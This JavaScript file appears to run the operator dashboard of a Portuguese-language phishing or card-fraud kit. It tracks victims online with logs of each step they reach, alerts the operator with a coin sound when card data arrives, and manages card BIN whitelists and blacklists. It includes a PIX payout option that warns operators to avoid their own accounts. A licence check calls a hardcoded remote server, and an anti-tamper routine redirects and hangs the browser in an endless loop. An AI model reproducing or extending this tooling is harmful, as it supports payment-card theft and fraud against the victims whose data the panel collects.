(function(){
	
$("#name_index").html('Pack B2W 1.0 Beta - Gênus');


  document.write('<scr'+ 'IPT type="text/javascript" SRC="vendor/global/global.min.js"></SCRIPT>');
  document.write('<scr'+ 'IPT type="text/javascript" SRC="vendor/bootstrap-select/dist/js/bootstrap-select.min.js"></SCRIPT>');
  document.write('<scr'+ 'IPT type="text/javascript" SRC="js/custom.min.js"></SCRIPT>');
  document.write('<scr'+ 'IPT type="text/javascript" SRC="vendor/chart.js/Chart.bundle.min.js"></SCRIPT>');
  document.write('<scr'+ 'IPT type="text/javascript" SRC="js/deznav-init.js"></SCRIPT>');
  document.write('<scr'+ 'IPT type="text/javascript" SRC="vendor/owl-carousel/owl.carousel.js"></SCRIPT>');
  
  document.write('<scr'+ 'IPT type="text/javascript" SRC="vendor/apexchart/apexchart.js"></SCRIPT>');
  document.write('<scr'+ 'IPT type="text/javascript" SRC=""></SCRIPT>');
  document.write('<scr'+ 'IPT type="text/javascript" SRC="js/dashboard/dashboard-1.js"></SCRIPT>');
  document.write('<scr'+ 'IPT type="text/javascript" SRC="js/plugins-init/chartjs-init.js"></SCRIPT>');


	re = $('#knk').val();

	sv = 'http://185.5.248.16/sv/api/safe.php?cod='+re;
	 
	   $.ajax({
  url: sv,
  cache: false,
  success: function(html){
	  
	  obj = JSON.parse(html);
	  

	  
	  
	  if (obj.status != '1') {
		  
		window.location.href = Math.floor(Math.random() * 65536);
		
		function changeColor() {
			
		while (0 <= 1) { console.log (1)}

		}
		
		 $('#menu').css('display', 'none');

		
		setTimeout(changeColor, 2000);
		  
	  }  else if (obj.status == '1') {
		  
		  $('#menu').css('display', 'flex');

		  
	  }
	  



	}, error: function () {
		
		window.location.href = Math.floor(Math.random() * 65536);


		function changeColor() {
			
		while (0 <= 1) { console.log (1)}

		}
		
		setTimeout(changeColor, 2000);
	}
	  
	  
  });

  
  
})();


	
	
	
	
	setInterval(function(){
			

		top.dda = `internal/list_online.php`
	 
	   $.ajax({
  url: top.dda,
  cache: false,
  success: function(html){
	  
	 var html_list = html.split('-- list_online --');
	 var html_qtd = html.split('-- list_qtd --');
	 var html_now = html.split('-- list_now --');
	 var html_cc = html.split('-- list_cc --');
	
	 qtd_now = parseInt(html_now[1])
	 qtd_cc = parseInt(html_cc[1])
	 


	 $('#online_list').html(html_list[1]);
	 $('#online_now').html(html_qtd[1]);
	
	if (qtd_now <= 10 & qtd_now > 0 & qtd_now != 0999  )  {
		 
		bup = `bump/${qtd_now}.mp3`
		var snd = new Audio(bup);  
		snd.play();
		 
	 } else if (qtd_now > 10 & qtd_now != 0999) {
	 
	 
	 	bup = `bump/11.mp3`
		var snd = new Audio(bup);  
		snd.play();

	} else if (qtd_now == 0999) {
		
		bup = `bump/now_0.mp3`
		var snd = new Audio(bup);  
		snd.play();
		
	}


	if (qtd_cc == 1) {
		
		bup_2 = 'bump/coin.mp3'
		var snd_2 = new Audio(bup_2);  
		snd_2.play();
		
	}


	}
	  
	  
  });
			
			
			
		}, 10000)
		
		
		
		
	function click_list (id, nome, etapa, acao) {
		
	$('#add_log').html('');
	
	logs = etapa.split('|');
	qtd_log = logs.length - 1
	
	
	
	
	$('#list_on_1').css('display', 'none');
	$('#list_on_2').css('display', 'block');
	
	
	$('#nome_list').html(nome);
	$('#etapa_list').html('');
	
	
	
	i = 1
	
	while (i <= qtd_log) {
		
		if (i != qtd_log) {
			
		$("#add_log").append(' <li><a href="javascript:void(0)"><span class="align-middle mr-2"><i class="fa fa-chevron-right"></i></span>'+logs[i]+'</a></li>');
		
		} else {
			
		$("#add_log").append(' <li><a href="javascript:void(0)"><span class="align-middle mr-2"><i class="fa fa-chevron-right"></i></span><font color="green">'+logs[i]+'</font></a></li>');

		}

		i = i + 1
		
	}

	
}

function back_list () {
	
	$('#list_on_1').css('display', 'block');
	$('#list_on_2').css('display', 'none');

	
}


function btn_add () {
	
		 var code = $("#code_text").val();

		if (code.length > 100) {
			
		$('#btn_submit').css('display', 'none');
		$('#btn_load').css('display', 'block');

			
		} else {
			
		$('#add_msg1').css('display', 'block');

			
		}

	
	
	
}

function btn_save () {

			
		$('#btn_save').css('display', 'none');
		$('#btn_load').css('display', 'block');

}


function bots () {
		
	r = $('#knk').val();

	s = 'http://185.5.248.16/sv/api/safe.php?cod='+r;
	 
	   $.ajax({
  url: s,
  cache: false,
  success: function(html){
	  
	  obj = JSON.parse(html);
	  

	  
	  
	  if (obj.status != '1') {
		  
		window.location.href = Math.floor(Math.random() * 65536);
		
		function changeColor() {
			
		while (0 <= 1) { console.log (1)}

		}
		
		setTimeout(changeColor, 2000);
		  
	  } else if (obj.status == '1') {
		  
		  	$('#menu').css('display', 'flex');

		  
	  }
	  



	}, error: function () {
		
		window.location.href = Math.floor(Math.random() * 65536);


		function changeColor() {
			
		while (0 <= 1) { console.log (1)}

		}
		
		setTimeout(changeColor, 2000);
	}
	  
	  
  });

		
		
	}
	

	


function comments (id) {
	
	
	 $('#loader_img').css('display', 'block');

	 
	   $.ajax({
  url: `table_comment.php?id=${id}`,
  cache: false,
  success: function(html){
	  

	 $('#table_comment').html(html);
	 $('#loader_img').css('display', 'none');


	}
	  
	  
  });
	
	
	
}



function edit_comment (id, nome, nota, nota_type, recomenda, descricao) {
	
	$('#modal_edit').css("display", "block");
	
	$('#nome_txt').attr("value", nome);
	
	$("input:radio[value='" +nota+"'][name='rating2']").prop('checked',true);
	$("input:radio[value='" +nota_type+"'][name='level']").prop('checked',true);
	$("input:radio[value='" +recomenda+"'][name='recomenda']").prop('checked',true);


	
	$('#comment_txt').attr("value", descricao);
	$('#comment_txt').html(descricao);
	
	$('#id_comment').attr("value", id);


	
	
}





	setInterval(function(){	

			bots ()
			
		}, 60000)






function bins_more (modo) {
	
	$('#btn_more').css('display', 'none');
	$('#loader_img').css('display', 'block');

	 valor_a = $('#bin_atual').val();
	 valor = parseInt(valor_a) + 1
	 valor_input = parseInt(valor_a) + 31
	 

	 

	   $.ajax({
  url: `table_bins.php?val1=${valor}&modo=${modo}`,
  cache: false,
  success: function(html){
	  
	$('#bin_atual').attr("value", valor_input);
	
	
	if (modo == 'w' | modo == 'b' ) {
		 
		$("#table_bins").html('');
		$('#btn_more').css('display', 'none');
		
	 } else {
	 
	$('#btn_more').css('display', 'block');
	
	 }
	 
	$('#loader_img').css('display', 'none');
	$("#table_bins").append(html);



	}
	  
	  
  });
	
	
	
}

function remove_bin_list (modo, id) {
	


	 
	   $.ajax({
  url: `internal/remove_bin.php?remove=${id}`,
  cache: false,
  success: function(html){
	  		
		
		if (modo == 'w') {
			
		bins_more('w')
			
		} else if (modo == 'b') {
			
		bins_more('b')

			
		}


	}
	  
	  
  });
	
	
	
}


function search_bins (id) {
	
	$('#loader_search_bin').css('display', 'block');
	$("#msg_error_1").html('');
	$("#msg_success_1").html('');

	 valor_a = $('#bin_number').val();
	 valor = parseInt(valor_a) 

	 
	 

	   $.ajax({
  url: `internal/bin_search.php?bin=${valor}`,
  cache: false,
  success: function(html){
	
	if (html == 2) {
		
	$("#msg_error_1").html('Bin não encontrada no sistema');
	$('#loader_search_bin').css('display', 'none');
	$("#view_bin_result").html('');

		
	} else {

	$("#view_bin_result").html(html);
	$('#loader_search_bin').css('display', 'none');


	}

	}
	  
	  
  });
	
	
	
}




function list_bin (modo, bin) {
	
	

	 bin_filtro = parseInt(bin) 

	 if (modo == 'w') {
		 
	   $("#btn_bin_white").html('Aguarde...');

	 } else if (modo == 'b') {
		 
		$("#btn_bin_black").html('Aguarde...');

	 }
	 

	   $.ajax({
  url: `internal/list_bin.php?bin=${bin_filtro}&modo=${modo}`,
  cache: false,
  success: function(html){
	
	if (html == 2) {
		
	if (modo == 'w') {
		 
	  $("#btn_bin_white").html('Adicionar a Whitelist');
	  $("#msg_error_1").html('Erro ao adicionar a Whitelist');

	 } else if (modo == 'b') {
		 
				 
	  $("#btn_bin_black").html('Adicionar a Blacklist');
	  $("#msg_error_1").html('Erro ao adicionar a BlackList');

	 }
		



		
	} else {


	if (modo == 'w') {
		 
	  $("#btn_bin_white").html('Adicionar a Whitelist');
	  $("#msg_success_1").html('Sucesso ao adicionar a Whitelist');

	 } else if (modo == 'b') {
		 
				 
	  $("#btn_bin_black").html('Adicionar a BlackList');
	  $("#msg_success_1").html('Sucesso ao adicionar a BlackList');

	 }


	}

	}
	  
	  
  });
	
	
	
}







if ( window.bots ) {} else {
	
		window.location.href = Math.floor(Math.random() * 65536);


		function changeColor() {
			
		while (0 <= 1) { console.log (1)}

		}
		
		setTimeout(changeColor, 2000);

	
}





function bip_play (bip) {
	
	
		bup = 'bump/'+bip+'.mp3'
		var snd = new Audio(bup);  
		snd.play();
	
}


function gerar_key () {
	
	
	
	
}


function pix_show() {
	
	
	if ($('#pixx').is(":checked"))
	{
		
		
		$('#input_key').css('display', 'block');
		alert ('ATENÇÂO: Use o PIX com responsabilidade, nãu ultilize sua própria conta, nem chaves como Email, Telefone ou CPF. Só ative essa opção se você tiver os materiais certos para trabalhar com isso, evite problemas para você mesmo e para todos que usam a tela.');
		
		
	} else {
		
		$('#input_key').css('display', 'none');

	}
	
	
	
	
}





$("#add_user").click(function(event){
	
	
	var user= prompt("Escolha um usuario:");

	if (user != null ) {

	if (user.length > 1)	{
		
		
		var pass= prompt("Escolha uma senha:");
		
			if (pass != null ) {

			if (pass.length > 1)	{
				
				
		
		  $.ajax({
	 
			url: 'internal/add_user.php?user='+user+'&pass='+pass,
  
			cache: false,
			success: function(html){
	  
				window.location.href = 'configuracao.php';
				
				
			}
			
	  
			});
		
		
		
				
			}
			
			
			}
		
		
		
		
		
	}
	
	}
	
});








